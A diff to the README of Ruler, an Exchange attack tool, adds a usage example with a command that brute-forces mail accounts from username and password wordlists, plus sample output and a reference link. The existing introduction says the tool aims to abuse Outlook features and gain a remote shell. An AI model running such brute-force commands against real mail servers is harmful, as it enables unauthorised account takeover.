@@ -1,3 +1,19 @@
+## usage
+
+```
+./ruler-linux64 -k --domain mail.xxxx.com brute --users  /opt/dict/username/top500.txt --passwords /opt/dict/password/top3.txt --verbose
+
+[+] Starting bruteforce
+[+] Trying to Autodiscover domain
+
+ error occured in connection - Get https://mail.xxx.com/autodiscover/autodiscover.xml
+```
+
+## 参考文章
+
+https://yoga7xm.top/2020/02/28/exchange/
+
+
 # Introduction
 
 Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. The main aim is abuse the client-side Outlook features and gain a shell remotely.
